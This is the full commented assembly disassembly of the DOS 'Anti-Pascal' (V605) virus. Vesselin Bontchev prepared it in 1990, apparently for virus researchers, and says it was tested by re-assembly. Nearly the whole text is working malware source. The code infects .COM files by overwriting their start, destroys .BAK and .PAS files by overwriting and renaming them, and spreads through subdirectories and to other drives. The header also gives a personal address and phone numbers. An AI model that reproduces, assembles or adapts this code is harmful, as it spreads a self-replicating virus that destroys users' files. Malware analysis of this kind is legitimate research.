	page	,132
	name	V605
	title	V605 - The 'Anti-Pascal' Virus
	.radix	16

; ษออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
; บ  Bulgaria, 1404 Sofia, kv. "Emil Markov", bl. 26, vh. "W", et. 5, ap. 51 บ
; บ  Telephone: Private: +359-2-586261, Office: +359-2-71401 ext. 255	     บ
; บ									     บ
; บ			     The 'Anti-Pascal' Virus                         บ
; บ		   Disassembled by Vesselin Bontchev, June 1990 	     บ
; บ									     บ
; บ		    Copyright (c) Vesselin Bontchev 1989, 1990		     บ
; บ									     บ
; บ	 This listing is only to be made available to virus researchers      บ
; บ		   or software writers on a need-to-know basis. 	     บ
; ศออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ

; The disassembly has been tested by re-assembly using MASM 5.0.

code	segment
	assume	cs:code,ds:code

	org	100

vlen	=	v_end-start
crit	equ	12

start:
	push	ax		; Save registers used
	push	cx
	push	si
	push	di
	push	bx
	push	flen		; Save current file length

; The operand of the instruction above is used as a signature by the virus

sign	equ	$-2

	jmp	v_start 	; Go to virus start

flen	dw	vlen		; File length before infection
fmask	db	'*.'            ; Mask for FindFirst/FindNext
fext	db	'com', 0        ; The extension part of the file mask
parent	db	'..', 0         ; Path for changing to the parent dir

com	db	'com'           ; File extensions used
bak	db	'bak'
pas	db	'pas'
wild	db	'???'
exe	db	'exe'

dta	equ	$		; Disk Transfer Address area
drive	db	?		;Drive to search for
pattern db	11d dup (?)	;Search pattern
reserve db	9 dup (?)	;Not used
attrib	db	?		;File attribute
time	dw	?		;File time
date	dw	?		;File date
fsize	dd	?		;File size
namez	db	14d dup (?)	;File name found

counter db	?
mem_seg dw	?		; Segment of the allocated I/O buffer
sizehld dw	?		; Size holder

v_start:
	mov	counter,2	; Set initial counter value
	mov	bx,1000 	; Shrink program memory size to 64 K
	mov	ah,4A
	int	21		; Do it

	mov	ah,48		; Allocate I/O buffer in memory
	mov	bx,vlen/16d+1	;  (at least vlen long)
	int	21		; Do it
	jc	cleanup 	; Exit on error
	mov	mem_seg,ax	; Save the segment of the allocated memory

	mov	ax,2524 	; Set critical error handler
	mov	dx,offset int_24
	int	21		; Do it

	mov	ah,1A		; Set new DTA area
	mov	dx,offset dta
	int	21		; Do it

	mov	ah,19		; Get default drive
	int	21
	push	ax		; Save it on stack

	call	infect		; Proceed with infection
	jc	cleanup 	; Exit on error

	int	11		; Put equipment bits in ax
	test	ax,1		; Diskette drives present?
	jz	cleanup 	; Exit if not (?!)

	shl	ax,1		; Get number of floppy disk drives
	shl	ax,1		;  in AH (0-3 means 1-4 drives)
	and	ah,3

	add	ah,2		; Convert the number of drives to
	mov	al,ah		;  the range 2-5 and put it into BL
	mov	bx,ax
	xor	bh,bh

	cmp	bl,3		; More than 2 floppy drives?
	ja	many		; Check if the highest one is removable if so
	mov	bl,3		; Otherwise check disk D:
many:
	mov	ax,4408 	; Check whether device is removable
	int	21
	jc	cleanup 	; Exit on error (network)
	or	ax,ax		; Is device removable?
	jz	cleanup 	; Exit if so

	mov	dl,bl		; Otherwise select it as default
	mov	ah,0E
	int	21		; Do it

	call	infect		; Proceed with this drive also

cleanup:
	pop	dx		; Restore saved default disk from stack
	mov	ah,0E		; Set default drive
	int	21		; Do it

	pop	flen		; Restore flen

	mov	es,mem_seg	; Free allocated memory
	mov	ah,49
	int	21		; Do it

	mov	ah,4A		; Get all the available memory
	push	ds		; ES := DS
	pop	es
	mov	bx,-1
	int	21		; Do it

	mov	ah,4A		; Assign it to the program (the initial state)
	int	21		; Do it

	mov	dx,80		; Restore old DTA
	mov	ah,1A
	int	21		; Do it

	mov	ax,2524 	; Restore old critical error handler
	push	ds		; Save DS
	lds	dx,dword ptr ds:[crit]
	int	21		; Do it
	pop	ds		; Restore DS

	pop	bx		; Restore BX

	mov	ax,4F		; Copy the program at exit_pgm into
	mov	es,ax		;  the Intra-Aplication Communication
	xor	di,di		;  Area (0000:04F0h)
	mov	si,offset exit_pgm
	mov	cx,pgm_end-exit_pgm	; exit_pgm length
	cld
	rep	movsb		; Do it
	mov	ax,ds		; Correct the Far JMP instruction with
	stosw			;  the current DS value

	mov	di,offset start ; Prepare for moving vlen bytes
	mov	si,flen 	;  from file end to start
	add	si,di
	mov	cx,vlen
	push	ds		; ES := DS
	pop	es
;	jmp	far ptr 004F:0000	; Go to exit_pgm
	db	0EA, 0, 0, 4F, 0

exit_pgm:
	rep	movsb		; Restore the original bytes of the file
	pop	di		; Restore registers used
	pop	si
	pop	cx
	pop	ax
	db	0EA, 0, 1	; JMP Far at XXXX:0100
pgm_end equ	$

lseek:
	mov	ah,42
	xor	cx,cx		; Offset := 0
	xor	dx,dx
	int	21		; Do it
	ret			; And exit

f_first:			; Find first file with extension pointed by SI
	mov	di,offset fext	; Point DI at extension part of fmask
	cld			; Clear direction flag
	movsw			; Copy the extension pointed by SI
	movsb			;  to file mask for FindFirst/FindNext
	mov	ah,4E		; Find first file matching fmask
	mov	cx,20		; Normal files only
	mov	dx,offset fmask
	ret			; Exit

wr_body:
	mov	ax,3D02 	; Open file for reading and writing
	mov	dx,offset namez ; FIle name is in namez
	int	21		; Do it
	mov	bx,ax		; Save handle in BX

	mov	ah,3F		; Read the first vlen bytes of the file
	mov	cx,vlen 	;  in the allocated memory buffer
	push	ds		; Save DS
	mov	ds,mem_seg
	xor	dx,dx
	int	21		; Do it

	mov	ax,ds:[sign-start]	; Get virus signature
	pop	ds		; Restore DS
	cmp	ax,word ptr ds:[offset sign]	; File already infected?
	je	is_inf		; Exit if so
	push	ax		; Save AX
	mov	al,0		; Lseek to the file beginning
	call	lseek		; Do it
	mov	ah,40		; Write virus body over the
	mov	dx,offset start ;  first bytes of the file
	mov	cx,sizehld	; Number of bytes to write
	int	21		; Do it

	pop	ax		; Restore AX
	dec	counter 	; Decrement counter
	clc			; CF == 0 means infection successfully done
	ret			; Exit
is_inf:
	stc			; CF == 1 means file already infected
	ret			; Exit

destroy:
	call	f_first 	; Find first file to detroy
f_next1:
	int	21		; Do it
	jc	no_more1	; Exit if no more files

	mov	ax,word ptr fsize	; Get file size
	mov	sizehld,ax	; And save it in sizehld
	call	wr_body 	; Write virus body over the file
	jc	close1		; Exit on error
	mov	si,offset com	; Change fmask to '*.COM'
	call	f_first 	; Do it
	mov	ah,56		; Rename file just destroyed as a .COM one
	mov	di,dx
	mov	dx,offset namez ; File name to rename
	int	21		; Do it

; The RENAME function call will fall if file with this name already exists.

	jnc	close1		; Exit if all is OK

	mov	si,offset exe	; Otherwise try to rename the file
	call	f_first 	;  as an .EXE one
	mov	ah,56
	int	21		; Do it

close1:
	mov	ah,3E		; Close the file handle
	int	21		; Do it

	cmp	counter,0	; Two files already infected?
	je	stop		; Stop if so
	mov	ah,4F		; Other wise proceed with the next file
	jmp	f_next1

; Here the returned error code in CF means:
;    0 - renaming unsuccessful
;    1 - renaming successful

stop:
	clc
no_more1:
	cmc			; Complement CF (CF := not CF)
	ret

infect:
	mov	si,offset com	; Find the first .COM file in this dir
	call	f_first
f_next2:
	int	21		; Do it
	jc	do_damage	; Do damage if no such files

	mov	ax,word ptr fsize	; Check the size of the file found
	cmp	ax,vlen 	; Less than virus length?
	jb	close2		; Too small, don't touch
	cmp	ax,0FFFF-vlen	; Bigger than 64 K - vlen?
	ja	close2		; Too big, don't touch
	mov	flen,ax 	; Save file length
	mov	sizehld,vlen
	call	wr_body 	; Write virus body over the file
	jc	close2		; Exit on error
	cmp	ax,6F43 	; ?!
	je	close2
	mov	al,2		; Lseek to file end
	call	lseek		; Do it
	push	ds		; Save DS
	mov	ds,mem_seg	; Write the original bytes from
	mov	cx,vlen 	;  the file beginning after its end
	xor	dx,dx
	mov	ah,40
	int	21		; Do it
	pop	ds		; Restore DS

close2:
	mov	ah,3E		; Close the file handle
	int	21		; Do it

	mov	ah,4F		; Prepare for FindNext
	cmp	counter,0	; Two files already infected?
	jne	f_next2 	; Continue if not
	stc			; Otherwise set CF to indicate error
err_xit:
	ret			; And exit

do_damage:
	mov	si,offset bak	; Try to "infect" and rename a .BAK file
	call	destroy 	; Do it
	jc	err_xit 	; Exit if "infection" successful
	mov	si,offset pas	; Try to "infect" and rename a .PAS file
	call	destroy 	; Do it
	jc	err_xit 	; Exit if "infection" successful
	mov	si,offset wild	; Otherwise perform a subdirectory scan
	call	f_first
	mov	cx,110111b	; Find any ReadOnly/Hidden/System/Dir/Archive

f_next3:
	int	21		; Do it
	jc	no_more2	; Exit if no more
	mov	al,attrib	; Check attributes of the file found
	test	al,10000b	; Is it a directory?
	jz	bad_file	; Skip it if not
	mov	di,offset namez ; Otherwise get its name
	cmp	byte ptr [di],'.'       ; "." or ".."?
	je	bad_file	; Skip it if so
	mov	dx,di		; Otherwise change to that subdirectory
	mov	ah,3Bh
	int	21		; Do it

	mov	cx,16		; Save the 44 bytes of dta on stack
	mov	si,offset dta	; Point SI at the first word of dta
lp1:
	push	word ptr [si]	; Push the current word
	add	si,2		; Point SI at the next one
	loop	lp1		; Loop until done

	call	infect		; Preform infection on this subdirectory

	mov	cx,16		; Restore the bytes pushed
	mov	si,offset counter-2	; Point SI at the last word of dta
lp2:
	pop	word ptr [si]	; Pop the current word from stack
	sub	si,2		; Point SI at the previous word
	loop	lp2		; Loop until done

	pushf			; Save flags
	mov	dx,offset parent
	mov	ah,3Bh		; Change to parent directory
	int	21		; Do it
	popf			; Restore flags
	jc	err_xit 	; Exit if infection done

bad_file:
	mov	ah,4F		; Go find the next file
	jmp	f_next3

no_more2:
	clc			; Return CF == 0 (no errors)
	ret			; Exit

int_24: 			; Critical error handler
	mov	al,2		; Abort suggested (?!)
	iret			; Return

v_end	=	$

; Here goes the rest of the original program (if any):

; And here (after the  end of file) are the overwritten first 650 bytes:

	db	0E9, 55, 2
	db	597d dup (90)
	mov	ax,4C00 	; Program terminate
	int	21

code	ends
	end	start

